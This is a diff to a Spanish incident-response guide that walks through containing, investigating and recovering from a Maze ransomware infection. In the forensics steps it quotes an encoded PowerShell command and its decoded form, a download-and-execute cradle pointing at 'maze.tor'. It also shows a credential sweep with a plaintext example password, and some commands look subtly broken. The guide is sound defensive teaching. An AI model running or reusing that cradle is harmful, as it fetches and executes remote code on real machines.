@@ -102,8 +102,85 @@ Start-VBRWindowsFileRestore -RestorePoint $restorepoint -Path "D:\datos" -Destin
 ```
 ---
 
-## ❓ Problem
-Las pruebas de seguridad tradicionales validan únicamente el evento final de cifrado, ignorando que el ransomware moderno ejecuta entre 8 y 12 técnicas distintas antes de cifrar un solo archivo. Técnicas como la eliminación de copias de seguridad, la evasión de defensas, el reconocimiento de red y la exfiltración de datos ocurren en silencio antes del impacto visible, y son precisamente las más detectables si los controles están bien configurados.
+## ❓ Maze - RDP expuesto con credenciales robadas
+
+Escenario: Usuario de finanzas reporta que al abrir archivos ve "archivo.doc.MAZE". Todo el fileserver mapeado como unidad Z: está cifrado. Nota exige 50 BTC.
+
+Paso 1: Detener propagación inmediata
+
+```bash
+# Desde Domain Controller, deshabilitar cuenta comprometida
+net user juan.ventas /domain /active:no
+
+# Identificar desde dónde se propaga
+Get-WinEvent -ComputerName DC01 -LogName Security -MaxEvents 5000 | Where-Object {$_.Id -eq 4624 -and $_.Message -match "juan.ventas"} | Select TimeCreated, @{n='IP';e={($_.Message -split "Source Network Address:")[1] -split "\n"[0]}}
+
+# Salida: IP=10.0.0.45 (PC de Juan) haciendo conexiones a múltiples servidores
+# Aislar esa máquina
+psexec \\10.0.0.45 -s netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
+```
+
+Paso 2: Análisis forense de la máquina origen
+
+```bash
+# Adquirir artefactos con Velociraptor (desplegar agente primero)
+velociraptor.exe --config server.config.yaml client -v
+
+# Query VQL para encontrar ejecución de Mimikatz (técnica típica de Maze)
+# En consola de Velociraptor:
+SELECT * FROM pslist() WHERE Name =~ "mimikatz|procdump|lsass_dump"
+SELECT * FROM parse_evtx(filename="C:\\Windows\\System32\\winevt\\Logs\\Security.evtx") WHERE EventID = 4688 AND ProcessName =~ "powershell|cmd"
+
+# Encontrar script malicioso ejecutado:
+# powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAHoAZQAuAHQAbwByAC8AcABhAHkAbABvAGEAZAAnACkA
+```
+
+Paso 3: Descifrar el script de PowerShell ofuscado
+
+```bash
+# El Base64 decodifica a:
+# IEX (New-Object Net.WebClient).DownloadString('http://maze.tor/payload')
+
+# Ya no podemos bloquear porque ya pasó, pero identificamos el C2
+# Buscar conexiones salientes en logs de firewall perimetral
+cat /var/log/pfsense/filter.log | grep -i "maze.tor\|5.45.67.89"
+```
+
+Paso 4: Erradicar de todo el entorno
+
+```bash
+# Buscar todas las máquinas con la nota de rescate
+crackmapexec smb 10.0.0.0/24 -u "admin_emerg" -p "TempP@ss2026!" -M spider_plus -o READ_ONLY=true FOLDER="C:\Users" PATTERN="*MAZE*"
+
+# Salida identifica 8 máquinas comprometidas
+# Desplegar script de limpieza con PDQ Deploy a esas máquinas:
+
+# cleanup_maze.bat
+taskkill /f /im "maze_crypt.exe"
+sc stop "MazeService"
+schtasks /delete /tn "MazeUpdate" /f
+del /f /q "%APPDATA%\maze_crypt.exe"
+del /f /q "C:\Users\*\Desktop\*MAZE*"
+```
+
+Paso 5: Restaurar fileserver y forzar cambio de contraseñas
+
+```bash
+# Restaurar desde snapshot de Storage (NetApp)
+Invoke-NcSdkSnapshotRestoreVolume -Name "vol_fileserver_data" -Snapshot "hourly.2026-07-20_0600"
+
+# Si no hay snapshot, desde backup en cinta con Networker
+mminfo -avot -c "Full" -t "2026-07-19" | grep fileserver
+nsrrecover -s networker_server -c fileserver -t "2026-07-20 02:00" -d Z:\
+
+# Forzar cambio de contraseña a TODO el dominio
+Get-ADUser -Filter * -SearchBase "OU=Usuarios,DC=empresa,DC=local" | Set-ADUser -ChangePasswordAtLogon $true
+
+# Implementar LAPS para que no se repita (ejecutar en DC)
+Import-Module AdmPwd.PS
+Update-AdmPwdADSchema
+Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=empresa,DC=local"
+```
 
 ---
 
